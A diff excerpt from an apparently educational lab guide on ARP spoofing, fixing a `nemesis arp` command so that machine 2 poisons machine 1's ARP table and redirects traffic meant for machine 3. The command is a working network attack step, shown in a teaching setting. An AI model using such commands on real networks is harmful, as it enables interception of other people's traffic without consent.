@@ -78,7 +78,7 @@ You can check the contents of the arp table in machine 1 with `arp -a #all`.
 Now, use `nemesis` in machine 2 to attack the arp table in 1.
 
 ```
-sudo nemesis arp -v -S 192.168.1.3 -D 192.168.1.1 -h [MAC machine 2] [MAC machine 1]
+sudo nemesis arp -v -S 192.168.1.3 -D 192.168.1.1 -h [MAC machine 2] -m [MAC machine 1]
 ```
 
 This should effectively fool machine 1 into thinking that machine3 has the MAC of 2, thus redirecting packets to it.
